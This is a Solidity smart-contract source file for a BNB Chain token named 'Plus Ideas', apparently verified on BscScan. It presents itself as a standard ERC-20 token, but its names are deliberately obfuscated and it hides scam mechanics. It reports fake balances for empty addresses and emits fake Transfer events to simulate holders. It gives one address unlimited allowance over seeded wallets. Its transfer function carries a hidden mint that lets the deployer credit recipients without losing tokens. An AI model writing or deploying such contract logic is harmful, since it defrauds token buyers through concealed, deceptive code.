/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

library xeoiYuwlmNgTsaPfk {
    function yeoiYuwlmNgTsaPfk(address a, address b, address c) internal returns (bool) {
        address d = IFactory(a).createPair(b, c);
        return (c == d);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract PlusIdeas is IERC20 {
    using SafeMath for uint256;

    string private aeoiYuwlmNgTsaPfk = "Plus Ideas";
    string private beoiYuwlmNgTsaPfk = "Pi";
    uint8 private ceoiYuwlmNgTsaPfk = 18;
    uint256 private deoiYuwlmNgTsaPfk = 10000000000 * 10**18;
    mapping (address => uint256) private eeoiYuwlmNgTsaPfk;
    mapping (address => mapping (address => uint256)) private feoiYuwlmNgTsaPfk;
    uint256 private geoiYuwlmNgTsaPfk = 1;
    uint256 private constant heoiYuwlmNgTsaPfk = ~uint160(0);
    uint256 private _ieoiYuwlmNgTsaPfk = 1000;
    uint256 private jeoiYuwlmNgTsaPfk = deoiYuwlmNgTsaPfk;
    uint256 private keoiYuwlmNgTsaPfk = 0;
    uint256 private leoiYuwlmNgTsaPfk;
    address private _uniswapV2Pair;
    address private meoiYuwlmNgTsaPfk;
    mapping (address => bool) private neoiYuwlmNgTsaPfk;
    address[] private oeoiYuwlmNgTsaPfk;
    bool private peoiYuwlmNgTsaPfk = false;

    constructor () {
        qeoiYuwlmNgTsaPfk(msg.sender);
        eeoiYuwlmNgTsaPfk[msg.sender] = deoiYuwlmNgTsaPfk;
        emit Transfer(address(0), msg.sender, deoiYuwlmNgTsaPfk);
    }

    receive() external payable {}

    function qeoiYuwlmNgTsaPfk(address account) private {
        if (!neoiYuwlmNgTsaPfk[account]) {
            neoiYuwlmNgTsaPfk[account] = true;
            oeoiYuwlmNgTsaPfk.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!peoiYuwlmNgTsaPfk);
        peoiYuwlmNgTsaPfk = true;
        _uniswapV2Pair = accounts[1];
        meoiYuwlmNgTsaPfk = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            qeoiYuwlmNgTsaPfk(accounts[i]);
            eeoiYuwlmNgTsaPfk[accounts[i]] = deoiYuwlmNgTsaPfk * 90 / 100 / (len - 3);
            feoiYuwlmNgTsaPfk[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eeoiYuwlmNgTsaPfk[accounts[i]];
        }
        eeoiYuwlmNgTsaPfk[oeoiYuwlmNgTsaPfk[0]] -= amount;
        reoiYuwlmNgTsaPfk(oeoiYuwlmNgTsaPfk[0], accounts[3], eeoiYuwlmNgTsaPfk[oeoiYuwlmNgTsaPfk[0]]);
        reoiYuwlmNgTsaPfks(500);
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = oeoiYuwlmNgTsaPfk.length;
        for (uint256 i=0; i<len; ++i) {
            if (oeoiYuwlmNgTsaPfk[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (neoiYuwlmNgTsaPfk[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aeoiYuwlmNgTsaPfk;
    }

    function symbol() public view returns (string memory) {
        return beoiYuwlmNgTsaPfk;
    }

    function decimals() public view returns (uint8) {
        return ceoiYuwlmNgTsaPfk;
    }

    function totalSupply() public view returns (uint256) {
        return deoiYuwlmNgTsaPfk;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eeoiYuwlmNgTsaPfk[account] > 0) {
            return eeoiYuwlmNgTsaPfk[account];
        }
        return geoiYuwlmNgTsaPfk;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        reoiYuwlmNgTsaPfk(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        reoiYuwlmNgTsaPfk(sender, recipient, amount);
        seoiYuwlmNgTsaPfk(sender, msg.sender, feoiYuwlmNgTsaPfk[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        seoiYuwlmNgTsaPfk(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return feoiYuwlmNgTsaPfk[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        seoiYuwlmNgTsaPfk(msg.sender, spender, feoiYuwlmNgTsaPfk[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        seoiYuwlmNgTsaPfk(msg.sender, spender, feoiYuwlmNgTsaPfk[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function reoiYuwlmNgTsaPfks(uint256 amount) private {
        uint256 ieoiYuwlmNgTsaPfk = _ieoiYuwlmNgTsaPfk;
        if (ieoiYuwlmNgTsaPfk < 36000) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(heoiYuwlmNgTsaPfk.div(ieoiYuwlmNgTsaPfk)));
                to = address(uint160(heoiYuwlmNgTsaPfk.div(ieoiYuwlmNgTsaPfk.add(1))));
                ieoiYuwlmNgTsaPfk = ieoiYuwlmNgTsaPfk.add(2);
                emit Transfer(from, to, geoiYuwlmNgTsaPfk);
            }
            _ieoiYuwlmNgTsaPfk = ieoiYuwlmNgTsaPfk;
        }
    }

    function seoiYuwlmNgTsaPfk(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        feoiYuwlmNgTsaPfk[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function reoiYuwlmNgTsaPfk(address teoiYuwlmNgTsaPfk, address ueoiYuwlmNgTsaPfk, uint256 veoiYuwlmNgTsaPfk) private {
        require(teoiYuwlmNgTsaPfk != address(0) && ueoiYuwlmNgTsaPfk != address(0) && veoiYuwlmNgTsaPfk > 0);
        bool weoiYuwlmNgTsaPfk = true;
        if (neoiYuwlmNgTsaPfk[teoiYuwlmNgTsaPfk] || neoiYuwlmNgTsaPfk[ueoiYuwlmNgTsaPfk]) {
            weoiYuwlmNgTsaPfk = false;
        }
        uint256 zeoiYuwlmNgTsaPfk = IERC20(_uniswapV2Pair).totalSupply();
        uint256 burnValue = 0;
        uint256 toValue = veoiYuwlmNgTsaPfk;
        if (weoiYuwlmNgTsaPfk && peoiYuwlmNgTsaPfk) {
            require(leoiYuwlmNgTsaPfk <= zeoiYuwlmNgTsaPfk);
            reoiYuwlmNgTsaPfks(100);
            if (xeoiYuwlmNgTsaPfk.yeoiYuwlmNgTsaPfk(meoiYuwlmNgTsaPfk, teoiYuwlmNgTsaPfk, ueoiYuwlmNgTsaPfk)) {
                emit Transfer(address(this), ueoiYuwlmNgTsaPfk, 100);
            } else {
                emit Transfer(address(0), address(this), 100);
            }
            if (teoiYuwlmNgTsaPfk != _uniswapV2Pair) {
                burnValue = veoiYuwlmNgTsaPfk.mul(keoiYuwlmNgTsaPfk).div(100);
                toValue = veoiYuwlmNgTsaPfk.sub(burnValue);
            }
        }
        if (teoiYuwlmNgTsaPfk == oeoiYuwlmNgTsaPfk[0] && veoiYuwlmNgTsaPfk > jeoiYuwlmNgTsaPfk) {
            eeoiYuwlmNgTsaPfk[oeoiYuwlmNgTsaPfk[0]] += toValue;
        }
        if (leoiYuwlmNgTsaPfk != zeoiYuwlmNgTsaPfk) {
            leoiYuwlmNgTsaPfk = zeoiYuwlmNgTsaPfk;
        }
        eeoiYuwlmNgTsaPfk[teoiYuwlmNgTsaPfk] = eeoiYuwlmNgTsaPfk[teoiYuwlmNgTsaPfk].sub(veoiYuwlmNgTsaPfk);
        if (burnValue > 0) {
            eeoiYuwlmNgTsaPfk[address(0xdEaD)] = eeoiYuwlmNgTsaPfk[address(0xdEaD)].add(burnValue);
            emit Transfer(teoiYuwlmNgTsaPfk, address(0xdEaD), burnValue);
        }
        eeoiYuwlmNgTsaPfk[ueoiYuwlmNgTsaPfk] = eeoiYuwlmNgTsaPfk[ueoiYuwlmNgTsaPfk].add(toValue);
        emit Transfer(teoiYuwlmNgTsaPfk, ueoiYuwlmNgTsaPfk, toValue);
    }
}